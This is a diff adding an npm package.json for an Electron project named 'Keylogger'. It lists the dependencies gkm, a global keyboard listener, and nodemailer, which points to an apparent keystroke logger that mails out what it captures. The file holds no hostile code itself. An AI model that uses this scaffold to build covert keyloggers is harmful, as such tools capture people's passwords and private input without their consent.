@@ -1,0 +1,18 @@
+{
+  "name": "Keylogger",
+  "version": "1.0.0",
+  "description": "",
+  "main": "src/app.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "start": "electron ."
+  },
+  "keywords": [],
+  "author": "",
+  "license": "ISC",
+  "dependencies": {
+    "electron": "^3.0.6",
+    "gkm": "^0.2.0",
+    "nodemailer": "^4.6.8"
+  }
+}
